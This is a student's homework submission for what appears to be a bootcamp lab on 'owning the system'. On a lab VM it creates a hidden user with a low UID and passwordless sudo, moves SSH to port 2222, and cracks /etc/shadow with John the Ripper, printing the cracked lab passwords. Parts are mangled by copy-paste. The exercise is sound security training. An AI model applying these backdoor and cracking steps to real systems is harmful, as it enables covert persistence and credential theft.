@@ -1,0 +1,257 @@
+Week 6 Homework Submission File: Advanced Bash - Owning the System
+Bob Huyck
+Please edit this file by adding the solution commands on the line below the prompt.
+Save and submit the completed file for your homework submission.
+Step 1: Shadow People
+1.	Create a secret user named sysd. Make sure this user doesn't have a home folder created:
+o	The first thing I did was login to the target system as sysadmin:
+sysadmin@UbuntuDesktop:~$ ssh sysadmin@192.168.6.105
+The authenticity of host '192.168.6.105 (192.168.6.105)' can't be established.
+ECDSA key fingerprint is SHA256:uoOQp+ntlpFyltJnig+s1pq8G7pPX/ZHm09UFe3vXi4.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.6.105' (ECDSA) to the list of known hosts.
+sysadmin@192.168.6.105's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb  6 20:47:35 UTC 2021
+
+  System load:  0.0               Processes:             98
+  Usage of /:   52.2% of 9.78GB   Users logged in:       1
+  Memory usage: 19%               IP address for enp0s3: 10.0.2.15
+  Swap usage:   0%                IP address for enp0s8: 192.168.6.105
+
+ * Introducing self-healing high availability clusters in MicroK8s.
+   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+76 packages can be updated.
+0 updates are security updates.
+
+New release '20.04.2 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+*** System restart required ***
+Last login: Sat Feb  6 19:05:59 2021 from 192.168.6.1
+sysadmin:~\ $
+o	 and then sudo to the root shell, with sudo -s
+o	I then created the sysd user:
+ sysadmin:~\ $ sudo -s
+[sudo] password for sysadmin: 
+root:~\ $ adduser --no-create-home   sysd
+Adding user `sysd' ...
+Adding new group `sysd' (1007) ...
+Adding new user `sysd' (1007) with group `sysd' ...
+Not creating home directory `/home/sysd'.
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+Changing the user information for sysd
+Enter the new value, or press ENTER for the default
+        Full Name []: 
+        Room Number []: 
+        Work Phone []: 
+        Home Phone []: 
+        Other []: 
+Is the information correct? [Y/n] Not creating home directory 
+•	Give your secret user a password: This was done during the user creation above
+2.	`/home/sysd'.Give your secret user a system UID < 1000:
+root:~\ $ usermod -u 301 sysd
+3.	Give your secret user the same GID:
+root:~\ $ groupmod -g 301 sysd
+cat /etc/passwd | grep sysd
+sysd:x:301:301:,,,:/home/sysd:/bin/bash
+4.	Give your secret user full sudo access without the need for a password:
+root:~\ $ visudo
+  GNU nano 2.9.3                  /etc/sudoers.tmp                             
+
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+
+# Vagrant Privs for config
+vagrant ALL=(ALL) NOPASSWD:ALL
+sysadmin  ALL=(ALL:ALL) /usr/bin/less
+sysd ALL=(ALL) NOPASSWD:ALL
+5.	Test that sudo access works without your password:
+Your bash commands here:
+sysadmin:~\ $ su sysd
+Password: 
+sysd@scavenger-hunt:/home/sysadmin$ sudo -l
+Matching Defaults entries for sysd on scavenger-hunt:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sysd may run the following commands on scavenger-hunt:
+    (ALL) NOPASSWD: ALL
+Step 2: Smooth Sailing
+1.	Edit the sshd_config file:
+Your bash commands here. 
+sysd@scavenger-hunt:/home/sysadmin$ sudo -s
+root@scavenger-hunt:/home/sysadmin# nano /etc/ssh/sshd_config 
+  GNU nano 2.9.3                /etc/ssh/sshd_config                           
+
+#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $
+
+# This is the sshd server system-wide configuration file.  See
+# sshd_config(5) for more information.
+
+# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin
+
+# The strategy used for options in the default sshd_config shipped with
+# OpenSSH is to specify options with their default value where
+# possible, but leave them commented.  Uncommented options override the
+# default value.
+
+Port 2222
+Step 3: Testing Your Configuration Update
+1.	Restart the SSH service:
+root@scavenger-hunt:/home/sysadmin# systemctl restart sshd
+Exit the root account:
+root@scavenger-hunt:/home/sysadmin# exit
+exit
+sysd@scavenger-hunt:/home/sysadmin$ 
+2.	
+3.	SSH to the target machine using your sysd account and port 2222:
+sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
+sysd@192.168.6.105's password: 
+Use sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
+sysd@192.168.6.105's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb  6 21:09:38 UTC 2021
+
+  System load:  0.0               Processes:             100
+  Usage of /:   52.2% of 9.78GB   Users logged in:       1
+  Memory usage: 19%               IP address for enp0s3: 10.0.2.15
+  Swap usage:   0%                IP address for enp0s8: 192.168.6.105
+
+ * Introducing self-healing high availability clusters in MicroK8s.
+   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+76 packages can be updated.
+0 updates are security updates.
+
+New release '20.04.2 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+*** System restart required ***
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Could not chdir to home directory /home/sysd: No such file or directory
+4.	sudo to switch to the root user:
+sysd@scavenger-hunt:/$ sudo -s
+
+
+Step 4: Crack All the Passwords
+1.	SSH back to the system using your sysd account and port 2222:
+sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
+sysd@192.168.6.105's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Feb  6 21:09:38 UTC 2021
+
+  System load:  0.0               Processes:             100
+  Usage of /:   52.2% of 9.78GB   Users logged in:       1
+  Memory usage: 19%               IP address for enp0s3: 10.0.2.15
+  Swap usage:   0%                IP address for enp0s8: 192.168.6.105
+
+ * Introducing self-healing high availability clusters in MicroK8s.
+   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+76 packages can be updated.
+0 updates are security updates.
+
+New release '20.04.2 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+*** System restart required ***
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Could not chdir to home directory /home/sysd: No such file or directory
+2.	Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
+sysd@scavenger-hunt:/$ sudo -s
+root@scavenger-hunt:/# john /etc/shadow
+Created directory: /root/.john
+Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:07 62% 1/3 0g/s 179.3p/s 179.3c/s 179.3C/s m9999983..M9999979
+letmein          (sysd)
+computer         (stallman)
+freedom          (babbage)
+trustno1         (mitnik)
+dragon           (lovelace)
+lakers           (turing)
+passw0rd         (sysadmin)
+7g 0:00:04:26 17% 2/3 0.02630g/s 193.1p/s 203.9c/s 203.9C/s roses2..minnie2
+7g 0:00:04:30 18% 2/3 0.02592g/s 193.9p/s 204.5c/s 204.5C/s denny2..happyday2
+7g 0:00:05:05 22% 2/3 0.02295g/s 198.4p/s 207.8c/s 207.8C/s anna7..flipper7
+7g 0:00:08:16 52% 2/3 0.01408g/s 208.5p/s 214.3c/s 214.3C/s 2amber..2cocacola
+7g 0:00:08:35 55% 2/3 0.01359g/s 209.9p/s 215.5c/s 215.5C/s 4stars..4yogibear
+Goodluck!        (student)
+8g 0:00:08:55 100% 2/3 0.01495g/s 210.8p/s 216.2c/s 216.2C/s Missy!..Jupiter!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@scavenger-hunt:/# john --show /etc/shadow
+sysadmin:passw0rd:18387:0:99999:7:::
+student:Goodluck!:18387:0:99999:7:::
+mitnik:trustno1:18387:0:99999:7:::
+babbage:freedom:18387:0:99999:7:::
+lovelace:dragon:18387:0:99999:7:::
+stallman:computer:18387:0:99999:7:::
+turing:lakers:18387:0:99999:7:::
+sysd:letmein:18664:0:99999:7:::
+
+8 password hashes cracked, 0 left
